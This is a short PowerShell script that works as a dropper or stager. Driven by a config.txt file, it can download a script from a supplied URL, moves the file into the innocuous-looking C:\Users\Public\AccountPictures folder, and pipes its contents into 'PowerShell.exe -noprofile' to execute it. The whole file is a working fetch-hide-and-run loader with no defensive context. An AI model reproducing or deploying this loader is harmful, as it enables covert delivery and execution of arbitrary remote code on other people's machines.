if (!(Test-Path ".\config.txt")) {
    Write-Error "Please create `"config.txt`" file!"
    Write-Error "Line 1: `"*SCRIPT NAME IN CURRENT DIRECTORY`""
    Write-Error "Line 2: `"C:\working\directory`""
    Write-Error "The rest of the config help is not available here."
    Exit
}

$SCRIPT_PATH = (Get-Content -Path .\config.txt -TotalCount 1)[-1]
$WORKING_DIR = (Get-Content -Path .\config.txt -TotalCount 2)[-1]
$DOWNLOADER  = (Get-Content -Path .\config.txt -TotalCount 3)[-1]
$HIDE_DIR    = "C:\Users\Public\AccountPictures"

cd $WORKING_DIR

if ($DOWNLOADER -eq "downloader.TRUE") {
    $LINK = (Get-Content -Path .\config.txt -TotalCount 4)[-1]

    Invoke-WebRequest $LINK -OutFile $SCRIPT_PATH

    Sleep -Milliseconds 50
}

Move-Item $SCRIPT_PATH -Destination $HIDE_DIR
cd $HIDE_DIR

Get-Content $SCRIPT_PATH | PowerShell.exe -noprofile -
